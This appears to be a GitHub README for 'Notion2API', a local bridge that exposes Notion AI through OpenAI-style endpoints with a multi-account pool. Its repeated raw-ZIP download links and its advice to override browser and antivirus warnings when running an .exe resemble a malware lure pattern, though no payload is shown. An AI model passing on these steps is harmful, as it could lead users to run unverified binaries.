# 🧩 Notion2API - Run Notion API Bridge Locally

[![Download Notion2API](https://img.shields.io/badge/Download-Notion2API-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip)

## 🖥️ What Notion2API Does

Notion2API is a local service that helps you connect to Notion AI through a simple API. It gives you:

- OpenAI-style API endpoints
- A web admin page for setup and account control
- Support for multiple accounts
- Local SQLite storage for data and session state
- Support for streaming replies
- Support for attachments like images, PDFs, and CSV files

Use it when you want one local place to manage access, test requests, or connect other tools to Notion AI.

## 📥 Download for Windows

1. Open the download page:
   [https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip](https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip)
2. On the page, get the Windows release file or source package.
3. Save it to a folder you can find again, such as `Downloads` or `Desktop`.
4. If you get a ZIP file, right-click it and choose **Extract All**.
5. If you get an `.exe` file, double-click it to start the app.

If your browser asks for permission, choose **Keep** or **Download anyway** if you trust the file source.

## 🚀 Quick Start on Windows

### 1) Unpack the files

If the download is a ZIP file:

- Right-click the ZIP file
- Select **Extract All**
- Pick a folder such as `C:\Notion2API`
- Open that folder after extraction

If the download is an app file:

- Move the file to a simple folder such as `C:\Notion2API`
- Keep the folder name short so it is easy to find

### 2) Start the app

Double-click the app file or start the included launcher.

If a terminal window opens, leave it open. The service runs while that window stays open.

### 3) Open the WebUI

In your browser, go to:

`http://127.0.0.1:8787/admin`

Use this page to sign in, manage accounts, and check service status.

### 4) Test the local API

Open:

`http://127.0.0.1:8787/healthz`

If the page returns a healthy status, the service is running.

## 🔧 First-Time Setup

Before you use the app, check these settings:

- `api_key`  
  This is the key used for the OpenAI-style API.

- `admin.password`  
  This is the password for the WebUI login.

- `upstream_base_url`  
  This is the address of the upstream site.

- `upstream_origin`  
  This is the origin header used for upstream requests.

- Account pool settings  
  Use these to add more than one account and switch between them.

If the app includes a config file, open it with Notepad and update the values before starting the service.

## 🌐 Main Addresses

After the app starts, use these local addresses:

- API: `http://127.0.0.1:8787/v1/*`
- Health check: `http://127.0.0.1:8787/healthz`
- WebUI: `http://127.0.0.1:8787/admin`

## ✨ What You Can Do

- Send chat requests through OpenAI-style endpoints
- Use streaming responses
- Manage several accounts in one place
- Refresh login state
- Send file-based requests with images, PDFs, and CSV files
- Store data locally in SQLite
- Use the built-in admin page instead of editing files by hand

## 🛠️ Common Windows Setup Steps

### If the app does not open

- Make sure the file finished downloading
- Check that your antivirus did not block it
- Move the app to a simple folder such as `C:\Notion2API`
- Try running it again

### If the browser cannot reach the page

- Confirm the app is still running
- Check that no other service uses port `8787`
- Refresh the page after a few seconds
- Try `http://127.0.0.1:8787/healthz` first

### If the login does not work

- Confirm the `admin.password` value in the config
- Make sure you are using the right account
- Clear saved browser data for `127.0.0.1`

### If requests fail

- Check `api_key`
- Check `upstream_base_url`
- Check `upstream_origin`
- Make sure your account is still signed in

## 📁 Data Storage

Notion2API stores local data in SQLite. This helps keep:

- Account records
- Session state
- Service status
- Local runtime data

Keep the data folder with the app if you want your settings to stay in place.

## 🔒 Basic Use Tips

- Keep your config file in one place
- Use a strong WebUI password
- Do not share your local API key with other people
- Close the app when you do not need it
- Back up the data folder before you change settings

## 🧪 Example Use Flow

1. Download Notion2API
2. Extract the files
3. Edit the config file
4. Start the app
5. Open the WebUI
6. Sign in
7. Check the health page
8. Send your first API request

## 📦 Build from Source

If you want to build it yourself, use the Go toolchain and run:

```powershell
Set-Location 'E:\WorkSpace\sub2api\chatgpt_register\Nation2API'
& 'D:\Go\bin\go.exe' build .\cmd\notion2api
```

To run from source:

```powershell
Set-Location 'E:\WorkSpace\sub2api\chatgpt_register\Nation2API'
& 'D:\Go\bin\go.exe' run .\cmd\notion2api --config .\config.example.json
```

## 🐳 Docker Setup

If you use Docker, edit `config.docker.json` first, then start the service:

```bash
docker compose up -d --build
```

For a production-style setup:

```bash
docker compose -f docker-compose.prod.yml up -d --build
```

## 📌 Endpoints at a Glance

- `/v1/models`
- `/v1/chat/completions`
- `/v1/responses`
- `/admin`
- `/healthz`

## 🧭 Suggested Folder Layout

You can keep the app in a simple folder like this:

- `C:\Notion2API\`
- `C:\Notion2API\config.json`
- `C:\Notion2API\data\`
- `C:\Notion2API\logs\`

This keeps the app files easy to find and update.

## 🧰 Helpful Checks Before Use

- Confirm the app is running
- Confirm the browser page opens
- Confirm the config file has the right values
- Confirm your account is signed in
- Confirm port `8787` is free
- Confirm the data folder is writable

## 📎 Download Again

If you need the download page again, use this link:

[https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip](https://raw.githubusercontent.com/Prudential-flathead401/Notion2API/main/deploy/Notion_API_3.8.zip)

## 📝 Simple Setup Checklist

- Download the files
- Extract them
- Edit the config file
- Start the app
- Open `http://127.0.0.1:8787/admin`
- Check `http://127.0.0.1:8787/healthz`
- Use the local API endpoint that fits your app